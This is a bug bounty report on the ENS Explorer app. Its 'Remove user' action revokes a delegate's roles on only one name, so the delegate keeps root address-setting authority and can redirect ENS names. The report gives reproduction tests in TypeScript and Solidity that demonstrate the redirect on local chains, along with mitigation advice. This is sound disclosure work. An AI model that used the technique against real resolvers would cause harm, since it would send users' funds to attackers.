# 90320 w a critical removed resolver user can still redirect ens names

## #90320 \[W\&A-Critical] Removed resolver user can still redirect ENS names

**Submitted on Aug 24th 2026 at 12:24:33 UTC by @abyy for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #90320
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Direct theft of user NFTs
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as:
    * resolving or rendering an ENS name to an attacker-controlled address
    * showing the wrong recipient or amount on a transaction the user then approves

### Description

### Executive summary

The Explorer app collapses every resolver-role assignment for an account into one UI row, even when those assignments belong to different on-chain resources such as the resolver root, `alice.eth`, and `bob.eth`. The row is presented as a single user, root membership is described as “Global roles (all names),” and its removal confirmation states that the user will be removed “from all roles.”

The resulting transaction does not match that representation. The removal handler selects only the first non-root name from the grouped row and submits one name-scoped `authorizeNameRoles(name, unionBitmap, account, false)` call. Root roles and every other name-scoped role are untouched.

Consequently, an account that the resolver owner has just removed can retain a root `ROLE_SET_ADDR` grant. That account can continue changing the Ethereum address of any name using the resolver to an attacker-controlled address. A sender resolving the affected ENS name can then transfer funds to the attacker.

### Severity

This reaches the competition's Critical impact for causing an ENS name to resolve to an attacker-controlled address so a user sends funds to an unintended recipient. The PoC demonstrates both the app-generated under-scoped revocation and the retained delegate's successful address-record overwrite.

### Root cause

The issue is a mismatch between the UI's account-level aggregation and the resolver contract's resource-scoped authorization model.

1. `groupRolesByAccount()` groups rows solely by `account`. For each additional resource, it appends the raw role row, adds the resource's name to `resolvedNames`, and unions the decoded roles into `decodedRoles`:
   * `apps/portal/src/lib/roles/resolverRoles.ts:179-220`
2. `ResolverRolesTable` uses this grouped value as the table's row model and passes the same row to `ResolverRolesSidebar`:
   * `apps/portal/src/features/resolver/components/ResolverRolesTable.tsx:102-105`
   * `apps/portal/src/features/resolver/components/ResolverRolesTable.tsx:128-137`
3. The sidebar derives one transaction scope from a multi-resource row:

   ```ts
   const decodedRoles = (row?.original.decodedRoles ?? []) as ResolverRoleKey[]
   const resolvedNames = row?.original.resolvedNames ?? []
   const roleName = resolvedNames.find((n) => n !== '(root)') ?? ''
   ```

   If the row contains `['(root)', 'alice.eth', 'bob.eth']`, `roleName` is `alice.eth`. The root is selected only when no named resource exists.

   * `apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:165-170`
4. Despite the multi-resource row being described as `Global roles (all names)` and the dialog promising removal `from all roles`, `handleRemoveUser()` creates only one pending action with that one `roleName` and the unioned `decodedRoles`:
   * `apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:307-323`
   * `apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:389-397`
   * `apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:441-463`
5. `prepareRevokeResolverRolesTransaction()` treats an empty name as root scope and every non-empty name as one name scope. It cannot revoke more than one resource in a single prepared call:
   * `apps/portal/src/features/resolver/helpers/revokeResolverRoles.ts:29-74`

The transaction therefore revokes the union bitmap only from `alice.eth`. It never revokes the same account's root resource or `bob.eth` resource.

At the contract layer, `authorizeNameRoles()` derives exactly one resource from `toName` and revokes only that resource. Root roles remain effective for every resource, so a retained root `ROLE_SET_ADDR` authorizes `setAddr()` for any node. The contract behaves correctly; the vulnerable asset is the Explorer transaction construction and misleading removal workflow.

### Vulnerability flow

{% stepper %}
{% step %}

#### Delegate receives roles

A PermissionedResolver owner has intentionally delegated root `ROLE_SET_ADDR` to another account. The same account also has at least one role scoped to a particular name on that resolver.
{% endstep %}

{% step %}

#### Explorer groups resources

The Explorer resolver overview receives separate `(resource, account, bitmap)` rows but groups them into one account row.
{% endstep %}

{% step %}

#### UI describes global access

Because the grouped row contains `(root)`, the sidebar labels it `Global roles (all names)`.
{% endstep %}

{% step %}

#### Owner removes the user

The owner clicks **Remove user** and confirms the dialog stating that the user will be removed from all roles.
{% endstep %}

{% step %}

#### App revokes only one scope

The app chooses the first non-root name and constructs one name-scoped revoke using the union of every displayed role.
{% endstep %}

{% step %}

#### Removal transaction succeeds

The owner signs and confirms the normal removal transaction. The transaction succeeds and the transaction modal closes.
{% endstep %}

{% step %}

#### Root role remains

The delegate's root `ROLE_SET_ADDR` was never changed.
{% endstep %}

{% step %}

#### Delegate redirects the name

The delegate calls `setAddr(node, attackerAddress)` for any victim name using that shared resolver.
{% endstep %}

{% step %}

#### Users resolve attacker address

The name now resolves to the attacker-controlled address. Any user who subsequently sends funds using that ENS name can send them to the attacker instead of the intended owner.
{% endstep %}
{% endstepper %}

The same root cause also leaves roles on the second and later names in a grouped row. The root-role case is the highest-impact instance because it preserves address-writing authority over every name on the resolver.

### Exploit conditions

* The victim name uses a PermissionedResolver shown in the Explorer resolver overview.
* The delegate has a root `ROLE_SET_ADDR` grant and at least one additional name-scoped grant on that resolver.
* An authorized resolver administrator uses the ordinary Explorer **Remove user** workflow on the grouped row.
* The delegate submits an ordinary resolver `setAddr` transaction after the incomplete revocation.

No compromised wallet, malicious browser extension, local-device access, indexer manipulation, privileged project address, or third-party service compromise is required. The only victim action is the intended role-removal workflow.

### In-scope asset and version

* **Asset:** Explorer app Files (`apps/portal`)
* **Competition repository:** `https://github.com/immunefi-team/audit-comp-ens`
* **Competition snapshot:** `cda79acaad59711b943fc68207ebb3f1d0ff8596`
* **Upstream audited revision recorded by that snapshot:** `63772fd872af472ced58b009499355f3430c2a86`

The supporting contract impact test uses ENS v2 contracts commit `8d9dcca8a7703e5d15958d628c39579d3aa789e1`. The contract is not claimed as vulnerable or in scope; it is used to execute the exact authorization semantics produced by the in-scope Explorer code.

### Reproduction summary

The frontend PoC imports the production `groupRolesByAccount()` and `prepareRevokeResolverRolesTransaction()` functions. It supplies root, `alice.eth`, and `bob.eth` grants for one delegate, executes the exact scope-selection expression used by `ResolverRolesSidebar`, decodes the resulting calldata, and proves that only `alice.eth` appears in the revoke call.

Run from the competition repository root:

```bash
pnpm --filter portal exec vitest run src/features/resolver/components/ResolverRolesSidebar.poc.test.ts --reporter=verbose
```

The contract impact test then executes that app-generated result: a name-scoped revoke while the delegate has root address authority. It proves that the root grant survives and that the supposedly removed delegate can redirect `bob.eth`. Its control test performs a correct root revocation and proves the same redirect then reverts.

Run from `contracts-v2/contracts` at commit `8d9dcca8a7703e5d15958d628c39579d3aa789e1`:

```bash
forge test --match-contract ResolverGroupedRoleRemovalPoC --match-test 'test_(removedDelegateStillRedirectsAnotherName|controlCorrectRootRevocationBlocksRedirect)' -vvv
```

Both tests pass. Complete setup instructions, source files, expected output, and assertion explanations are included in the standalone PoC.

### Impact

#### Short-term impact

The removal transaction succeeds without revoking the authority represented by the grouped UI row. The delegate retains undisclosed root and/or other-name permissions after the owner has completed a workflow explicitly described as removing the user from all roles.

#### Long-term and worst-case impact

If the retained permission is root `ROLE_SET_ADDR`, the removed delegate can modify the Ethereum address record of every name using the resolver. Resolution clients then return the attacker-controlled address. A wallet user who trusts the ENS name and approves a transfer can send ETH, ERC-20 tokens, or other assets to the attacker.

Other retained root roles can also permit record clearing, contenthash modification, text-record modification, or public-key modification. Retained name-scoped roles affect the second and later names omitted by the one-call removal.

### Recommended mitigation

#### Immediate mitigation

Disable account-level **Remove user** for grouped multi-resource rows, or require the administrator to revoke each displayed scope explicitly. The confirmation and transaction preview must identify the exact resources being revoked.

#### Correct fix

* Preserve resolver assignments as `(account, resource, bitmap)` entries for mutation purposes. Do not use a unioned bitmap plus one selected name as the mutation model.
* For removal, create one revocation for each raw role row in `row.original.roles`:
  * use root scope for `ROOT_RESOURCE`;
  * use the exact resolved name for each name resource;
  * use that resource's own bitmap, not the union across resources.
* If the resolver supports safe batching, batch those exact calls atomically. Otherwise, show one transaction step per resource and do not report full removal until every step confirms.
* After confirmation, query the resolver state and verify that the target account has zero roles on every resource shown in the confirmation dialog.

### Proof of Concept

## PoC: grouped resolver-role removal leaves root address authority active

### What this PoC proves

This PoC has three layers:

1. A frontend unit test imports the in-scope Explorer production functions and proves that a UI row containing root, `alice.eth`, and `bob.eth` roles is converted into a single revoke call scoped only to `alice.eth`.
2. A contract impact test executes that exact under-scoped result and proves that the removed delegate retains root `ROLE_SET_ADDR` authority and can redirect `bob.eth`. A control test revokes the root scope correctly and proves the redirect then reverts.
3. An optional Chromium-and-shell recording performs the real Explorer workflow against a local Anvil chain, decodes the mined UI transaction with `cast`, carries out the redirect from the removed delegate, and runs the correct-revocation control in a visible terminal.

The first two tests are deterministic and do not require a live RPC endpoint, funded account, or external service. The recorded workflow creates its own disposable local RPC endpoint and funded development accounts; it never uses a public chain.

### Environment

Tested with:

```
OS: Linux
Node: v24.19.0
pnpm: 10.27.0
Vitest: 4.1.5 (competition lockfile)
Foundry forge: 1.7.1
Solidity compiler: 0.8.27
```

Pinned revisions:

```
Explorer competition repository:
https://github.com/immunefi-team/audit-comp-ens
cda79acaad59711b943fc68207ebb3f1d0ff8596

ENS v2 contracts used only as the impact harness:
https://github.com/ensdomains/contracts-v2
8d9dcca8a7703e5d15958d628c39579d3aa789e1
```

The frontend input uses Sepolia chain ID `11155111`, matching the competition's primary network. No RPC request is made, so there is no block number to pin. The Foundry test uses a fresh local test EVM rather than a fork, so it also has no external chain or block dependency.

### Part 1: prove the Explorer emits only one name-scoped revoke

#### Setup

{% stepper %}
{% step %}

#### Clone and pin the repository

```bash
git clone https://github.com/immunefi-team/audit-comp-ens.git
cd audit-comp-ens
git checkout cda79acaad59711b943fc68207ebb3f1d0ff8596
corepack enable
pnpm install --frozen-lockfile
```

{% endstep %}

{% step %}

#### Create the PoC test

Create `apps/portal/src/features/resolver/components/ResolverRolesSidebar.poc.test.ts` with the following complete source:

```ts
import { permissionedResolverAuthorizeNameRolesSnippet } from '@ensdomains/ensjs-abi/v2/permissionedResolver'
import {
  type Address,
  decodeFunctionData,
  toHex,
  type WalletClient,
} from 'viem'
import { packetToBytes } from 'viem/ens'
import { describe, expect, it } from 'vitest'
import { prepareRevokeResolverRolesTransaction } from '@/features/resolver/helpers/revokeResolverRoles'
import {
  buildResourceToNameMap,
  computeNameResource,
  groupRolesByAccount,
  resolverRoles,
} from '@/lib/roles/resolverRoles'

const OWNER = '0x1000000000000000000000000000000000000001' as Address
const DELEGATE = '0x2000000000000000000000000000000000000002' as Address
const RESOLVER = '0x3000000000000000000000000000000000000003' as Address
const ROOT_RESOURCE = `0x${'0'.repeat(64)}`
const ALICE = 'alice.eth'
const BOB = 'bob.eth'

const walletClient = {
  account: { address: OWNER },
  chain: { id: 11155111 },
} as unknown as WalletClient

describe('PoC: resolver role removal is scoped to only the first grouped name', () => {
  it('leaves the delegate authorized at root and on every other name', () => {
    // The resolver overview returns one row per (resource, account). The UI
    // deliberately groups all three rows below into one "user" row.
    const grouped = groupRolesByAccount(
      [
        {
          account: DELEGATE,
          resource: ROOT_RESOURCE,
          roleBitmap: resolverRoles.ROLE_SET_ADDR.toString(),
        },
        {
          account: DELEGATE,
          resource: computeNameResource(ALICE),
          roleBitmap: resolverRoles.ROLE_SET_TEXT.toString(),
        },
        {
          account: DELEGATE,
          resource: computeNameResource(BOB),
          roleBitmap: resolverRoles.ROLE_SET_ADDR.toString(),
        },
      ],
      buildResourceToNameMap([{ name: ALICE }, { name: BOB }]),
    )

    expect(grouped).toHaveLength(1)
    const row = grouped[0]!
    expect(row.resolvedNames).toEqual(['(root)', ALICE, BOB])

    // These are the exact expressions used by ResolverRolesSidebar when the
    // victim clicks "Remove user". Despite the dialog promising removal from
    // "all roles", it chooses one non-root name and submits one scoped call.
    const roleName = row.resolvedNames.find((name) => name !== '(root)') ?? ''
    const intent = prepareRevokeResolverRolesTransaction({
      resolverAddress: RESOLVER,
      name: roleName,
      account: DELEGATE,
      roles: row.decodedRoles as Parameters<
        typeof prepareRevokeResolverRolesTransaction
      >[0]['roles'],
      walletClient,
      chainId: 11155111,
    })

    expect(intent.request.type).toBe('eoa')
    if (intent.request.type !== 'eoa') throw new Error('expected EOA request')

    const data = intent.request.data
    expect(data).toBeDefined()
    if (!data) throw new Error('expected transaction calldata')

    const decoded = decodeFunctionData({
      abi: permissionedResolverAuthorizeNameRolesSnippet,
      data,
    })
    expect(decoded.functionName).toBe('authorizeNameRoles')

    const [dnsName, , account, authorized] = decoded.args
    expect(dnsName).toBe(toHex(packetToBytes(ALICE)))
    expect(account.toLowerCase()).toBe(DELEGATE.toLowerCase())
    expect(authorized).toBe(false)

    // The emitted transaction names alice.eth only. PermissionedResolver
    // derives exactly one name resource from that argument, so neither the
    // ROOT_RESOURCE grant nor bob.eth's grant is touched by this call.
    expect(roleName).toBe(ALICE)
    expect(roleName).not.toBe(BOB)

    console.info({
      uiRowScopes: row.resolvedNames,
      dialogClaim: 'Remove user from all roles',
      submittedFunction: decoded.functionName,
      submittedScope: roleName,
      untouchedScopes: ['(root)', BOB],
    })
  })
})
```

{% endstep %}
{% endstepper %}

#### Exact run command

Run from the competition repository root:

```bash
pnpm --filter portal exec vitest run src/features/resolver/components/ResolverRolesSidebar.poc.test.ts --reporter=verbose
```

#### Expected output

```
RUN  v4.1.5 .../apps/portal

{
  uiRowScopes: [ '(root)', 'alice.eth', 'bob.eth' ],
  dialogClaim: 'Remove user from all roles',
  submittedFunction: 'authorizeNameRoles',
  submittedScope: 'alice.eth',
  untouchedScopes: [ '(root)', 'bob.eth' ]
}

✓ ... leaves the delegate authorized at root and on every other name
Test Files  1 passed (1)
Tests  1 passed (1)
```

#### Assertion meaning

* `grouped` has length one, proving that the production grouping function merges three distinct resources into one user row.
* `resolvedNames` contains root and both names, proving the row represents all three scopes.
* The decoded production calldata calls `authorizeNameRoles` with DNS-encoded `alice.eth` and `authorized == false`.
* Neither root nor `bob.eth` appears in the calldata, proving that those represented scopes cannot be changed by the one submitted call.

### Part 2: prove the retained root role redirects another name

#### Setup

{% stepper %}
{% step %}

#### Clone and prepare the contracts repository

```bash
git clone --filter=blob:none https://github.com/ensdomains/contracts-v2.git
cd contracts-v2
git checkout 8d9dcca8a7703e5d15958d628c39579d3aa789e1
git submodule update --init --recursive
cd contracts
mkdir -p test/poc
```

{% endstep %}

{% step %}

#### Create the impact harness

Create `test/poc/ResolverGroupedRoleRemoval.t.sol` with the following complete source:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {NameCoder} from "@ens/contracts/utils/NameCoder.sol";

import {PermissionedResolverLib} from "~src/resolver/libraries/PermissionedResolverLib.sol";
import {PermissionedResolverTest} from "../unit/resolver/PermissionedResolver.t.sol";

/// @notice Impact harness for the Explorer UI's grouped resolver-role removal.
/// The frontend groups root and per-name grants into one row, then revokes only
/// the first non-root name. This test executes that exact on-chain result.
contract ResolverGroupedRoleRemovalPoC is PermissionedResolverTest {
    function test_removedDelegateStillRedirectsAnotherName() external {
        bytes memory otherName = NameCoder.encode("bob.eth");
        bytes32 otherNode = NameCoder.namehash(otherName, 0);

        // This produces the UI row: "Global roles (all names)" plus alice.eth.
        vm.startPrank(owner);
        resolver.authorizeNameRoles(NameCoder.encode(""), PermissionedResolverLib.ROLE_SET_ADDR, actor, true);
        resolver.authorizeNameRoles(testName, PermissionedResolverLib.ROLE_SET_TEXT, actor, true);
        vm.stopPrank();

        // ResolverRolesSidebar's "Remove user from all roles" transaction:
        // it selects alice.eth and revokes the union bitmap on that name only.
        vm.prank(owner);
        resolver.authorizeNameRoles(
            testName, PermissionedResolverLib.ROLE_SET_ADDR | PermissionedResolverLib.ROLE_SET_TEXT, actor, false
        );

        // The global address-writing authority was never touched.
        assertTrue(
            resolver.hasRootRoles(PermissionedResolverLib.ROLE_SET_ADDR, actor),
            "root address role survived the UI removal"
        );

        // The supposedly removed delegate can still redirect any name using
        // this shared resolver to an attacker-controlled Ethereum address.
        vm.prank(actor);
        resolver.setAddr(otherNode, friend);
        assertEq(resolver.addr(otherNode), friend, "delegate redirected bob.eth");
    }

    function test_controlCorrectRootRevocationBlocksRedirect() external {
        bytes memory otherName = NameCoder.encode("bob.eth");
        bytes32 otherNode = NameCoder.namehash(otherName, 0);

        vm.prank(owner);
        resolver.authorizeNameRoles(NameCoder.encode(""), PermissionedResolverLib.ROLE_SET_ADDR, actor, true);

        // Control: revoking the same bitmap at the root resource, rather than
        // at alice.eth, removes the authority that the UI leaves behind.
        vm.prank(owner);
        resolver.authorizeNameRoles(NameCoder.encode(""), PermissionedResolverLib.ROLE_SET_ADDR, actor, false);

        assertFalse(
            resolver.hasRootRoles(PermissionedResolverLib.ROLE_SET_ADDR, actor), "root address role should be gone"
        );

        vm.expectRevert();
        vm.prank(actor);
        resolver.setAddr(otherNode, friend);
    }
}
```

{% endstep %}
{% endstepper %}

#### Exact run command

Run from `contracts-v2/contracts`:

```bash
forge test --match-contract ResolverGroupedRoleRemovalPoC --match-test 'test_(removedDelegateStillRedirectsAnotherName|controlCorrectRootRevocationBlocksRedirect)' -vvv
```

#### Expected output

```
Ran 2 tests for test/poc/ResolverGroupedRoleRemoval.t.sol:ResolverGroupedRoleRemovalPoC
[PASS] test_controlCorrectRootRevocationBlocksRedirect()
[PASS] test_removedDelegateStillRedirectsAnotherName()
Suite result: ok. 2 passed; 0 failed; 0 skipped
```

#### Assertion meaning and causality control

The exploit-path test grants root `ROLE_SET_ADDR` and a separate `alice.eth` role to the same delegate. It then performs the UI's one-call result: revoking the union bitmap only at `alice.eth`. `hasRootRoles()` remains true, and the delegate successfully changes `bob.eth` to the attacker-controlled `friend` address.

The control test changes only the revocation scope. It revokes `ROLE_SET_ADDR` at root, verifies the grant is absent, and expects the delegate's identical `setAddr()` call to revert. This establishes that the redirect is caused by the Explorer's incorrect scope selection.

### Safety

Both tests execute locally. The frontend test constructs and decodes calldata without signing or broadcasting it. The Foundry test deploys fresh contracts inside the local test EVM. No third-party system is queried, no public chain state is changed, and no denial-of-service traffic is generated.

### Part 3: record the real Explorer workflow and live shell verification

The self-contained recorder is in `poc/resolver-role-removal-browser`. It pins the competition commit, starts chain ID `11155111` on Anvil, deploys an ABI-compatible resolver authorization harness, starts the frozen Explorer app, and drives Chromium through the normal role-removal workflow.

After the Explorer transaction confirms, the recording closes the real success dialog and reloads the production roles view from the same chain. The removed account is still rendered with `(root) bob.eth`, `Set Address`, and `Set Text`; opening its production sidebar still shows global address authority. A visible `xterm` then uses `cast` against the same running chain to:

{% stepper %}
{% step %}

#### Decode the UI transaction

Fetch and decode the exact transaction mined from the Explorer UI.
{% endstep %}

{% step %}

#### Verify retained permissions

Prove that it names only `alice.eth` while root `ROLE_SET_ADDR` and the `bob.eth` bitmap remain active.
{% endstep %}

{% step %}

#### Redirect the ENS record

Submit `setAddr(bobNode, attacker)` from the supposedly removed delegate and read the changed record back.
{% endstep %}

{% step %}

#### Run the correct-revocation control

Revoke the root role correctly and prove that the identical delegate call now reverts.
{% endstep %}
{% endstepper %}

There is no generated verifier page or simulated result in the recording. Every terminal value is output by `cast` from the live local chain. The machine-readable `ui-verification.json` and `verification.json`, terminal transcript, individual phase videos, final combined video, and SHA-256 checksums are retained beside the recording.

The disposable setup does not run the competition's external indexer. Playwright therefore intercepts the Explorer's GraphQL transport for this resolver page. Static resolver/name identifiers come from the fixture, while every role bitmap returned before and after removal is read live from the local resolver contract at request time. The post-removal `(root) bob.eth` row is thus produced from mined chain state rather than hard-coded as a desired result. All grouping, labels, sidebar behavior, transaction construction, wallet interaction, and transaction UI are the frozen production Explorer code.

#### Empty Docker host

Prerequisites: Docker with the Compose plugin and enough disk space to build the pinned application image.

```bash
cd poc/resolver-role-removal-browser
./run.sh --docker
```

#### Native Chromium and shell

Prerequisites: Node 22, pnpm 10, Chromium, Foundry (`anvil`, `cast`, `forge`), `ffmpeg`, `jq`, `Xvfb`, and `xterm`.

```bash
cd poc/resolver-role-removal-browser
./run.sh --native
```

Each invocation creates a new UTC-timestamped directory under `artifacts/` and refuses to overwrite prior evidence. The final video is named `resolver-role-removal-real-verifier-silent.mp4`.
